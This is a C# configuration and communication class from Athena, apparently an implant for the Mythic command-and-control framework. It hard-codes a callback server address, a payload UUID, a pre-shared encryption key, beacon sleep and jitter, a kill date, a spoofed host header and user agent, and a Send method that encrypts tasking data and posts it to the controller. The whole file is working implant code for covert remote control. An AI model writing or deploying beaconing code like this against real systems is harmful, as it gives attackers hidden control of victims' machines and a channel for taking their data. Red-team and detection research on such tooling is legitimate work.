using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public HTTP currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SMBForwarder smbForwarder { get; set; }

        public MythicConfig()
        {

            this.uuid = "a27e858d-1465-4216-9b30-671543effb33";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("1", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new HTTP(this.uuid);
            this.smbForwarder = new SMBForwarder();
        }
    }
    public class HTTP
    {
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public DateTime killDate { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        //Change this to Dictionary or Convert from JSON string?
        public string headers { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        private HttpClient client { get; set; }

        public HTTP(string uuid)
        {
            HttpClientHandler handler = new HttpClientHandler();
            int callbackPort = Int32.Parse("80");
            string callbackHost = "http://192.168.4.201";
            string getUri = "get_uri";
            string queryPath = "query_path_name";
            string postUri = "post_uri";
            this.userAgent = "TestUserAgent";
            this.hostHeader = "TestHostHeader2";
            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}";
            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
            this.proxyHost = "";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.psk = "YQwm7Y/RoE7hV4Ek+hV1Zz0qCeGPDQczeGstOdKZVdM=";

            if (!string.IsNullOrEmpty(this.proxyHost))
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new HttpClient(handler);

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this.client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("True");

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }

        }
        public async Task<string> Send(object obj)
        {
            try
            {

                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                var response = await this.client.PostAsync(Globals.mc.MythicConfig.currentConfig.postURL, new StringContent(json));
                string msg = response.Content.ReadAsStringAsync().Result;

                if (this.encrypted)
                {
                    msg = this.crypt.Decrypt(msg);
                }
                else
                {
                    msg = Misc.Base64Decode(msg).Substring(36);
                }
                return msg;
            }
            catch
            {
                return "";
            }
        }
    }
}
